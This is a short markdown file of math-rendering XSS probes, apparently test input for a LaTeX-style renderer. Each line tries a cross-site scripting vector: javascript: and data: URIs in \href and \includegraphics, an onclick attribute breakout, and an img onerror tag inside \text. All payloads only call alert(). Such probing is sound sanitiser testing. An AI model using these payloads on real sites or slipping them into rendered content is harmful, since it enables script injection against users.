# math xss probes

Inline href: $\href{javascript:alert(document.domain)}{CLICKME1}$

Block href:

$$\href{javascript:alert(2)}{CLICKME2}$$

Data uri: $\href{data:text/html,<script>alert(3)</script>}{CLICKME3}$

CSS injection via \style or \color: $\color{red}{x}$

Unicode/enclose: $\enclose{updiagonalstrike}[style="color:red"]{x}$

Href with onclick attempt: $\href{https://example.com" onclick="alert(4)}{CLICKME4}$

Includegraphics: $\includegraphics{javascript:alert(5)}$

Textml raw: $\text{<img src=x onerror=alert(6)>}$
